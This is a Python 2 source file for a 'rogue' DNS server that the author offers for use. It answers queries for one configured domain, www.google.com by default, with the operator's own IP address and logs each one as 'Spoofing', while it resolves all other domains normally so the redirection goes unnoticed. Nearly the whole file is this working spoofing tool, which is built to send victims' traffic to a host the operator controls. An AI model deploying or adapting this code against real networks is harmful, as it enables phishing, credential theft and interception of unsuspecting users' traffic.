#!/usr/bin/python
#--------------------------------------------------
# Roque DNS Server With Dynamic Ip Resolving by Jimmy Kane
#--------------------------------------------------
# Author: Dimitrios Kanellopoulos
# Email: jimmykane9@gmail.com,
# Twitter: http://twitter.com/JimmyKane9
# Google+: http://gplus.to/jimmykane
# License: The GNU General Public License
#------------------------------------------------------------------------------------------------------
#----------
# Based on: http://www.tranquilidadtecnologica.com/2006/04/servidor-fake-dns-en-python.html 
# mirror: http://code.activestate.com/recipes/491264-mini-fake-dns-server/
#-------------------------------------------------------------------------------------------------------
# This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#----------------------------------------------------------------------------

import socket
import threading
import thread
import time
global Domain_Name,sleeptime,spoofed_domain
My_Domain_Name="www.mydomainname.com"#Your domain name or IP
spoofed_domain="www.google.com"
sleeptime=600 #DNS refresh interval in seconds. This is usefull when you are not on static ip plan by your ISP 600 = 10mins
global ip

def resolve_dn(domain_name):
  try:
    dataip = socket.gethostbyname_ex(domain_name) 
    ip = str(dataip[2][0]).strip("[] '")      
    print  "Resolving Domain [%s]->[%s]" %( domain_name ,  ip  )
    return ip
  except socket.gaierror: 
    print "Error! Resolving Domain [%s]!" %( domain_name )
    return "1.1.1.1"

def run_thread (threadname, sleeptime):

  global threadcount, activethreads, threadlock
  print "DnsResolver -> Setting Automated Refreshing -> [%ssec]"%sleeptime
  try:
    while 1:      
      time.sleep(sleeptime) 
      threadlock.acquire()
      resolve_dn(My_Domain_Name)
      threadlock.release()
      
  except: 
    print "%s error.... Ip changed to something unsual" % (threadname)
    activethreads = activethreads - 1
    threadlock.release()  

class DNSQuery:
  def __init__(self, data):
    self.data=data
    self.dominio=''
    tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
    if tipo == 0:                     # Standard query
      ini=12
      lon=ord(data[ini])
      while lon != 0:
        self.dominio+=data[ini+1:ini+lon+1]+'.'
        ini+=lon+1
        lon=ord(data[ini])

  def respuesta(self, ip):
    packet=''
    if self.dominio[:-1]==spoofed_domain:
      packet+=self.data[:2] + "\x81\x80"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
      packet+=self.data[12:]                                         # Original Domain Name Question
      packet+='\xc0\x0c'                                             # Pointer to domain name
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
      print 'Spoofing: [%s] -> [%s]' % (self.dominio[:-1], ip)
    
    else: 
      self.ip=resolve_dn(self.dominio[:-1])
      packet+=self.data[:2] + "\x81\x80"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
      packet+=self.data[12:]                                         # Original Domain Name Question
      packet+='\xc0\x0c'                                             # Pointer to domain name
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
      packet+=str.join('',map(lambda x: chr(int(x)), self.ip.split('.'))) # 4bytes of IP
      print 'Normal Request of: [%s] -> [%s]' % (self.dominio[:-1],self.ip)
    return packet
   

if __name__ == '__main__':  
  
  print  "Staring Rogue Dns Server for [%s]" % My_Domain_Name
  ip=resolve_dn(My_Domain_Name)
  activethreads = 1
  threadlock = thread.allocate_lock()  
  thread.start_new_thread(run_thread, ("DnsResolver", sleeptime)) 
  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('',53))
  print "Staring Script...."
  try:
    while 1:
      data, addr = udps.recvfrom(1024)
      p=DNSQuery(data)
      udps.sendto(p.respuesta(ip), addr)      
      
  except  KeyboardInterrupt:
    udps.close()
    print '\n\nUser Requested ctrl+c! \nClosing Connections -> [OK] '

  print 'All done Bye bye'
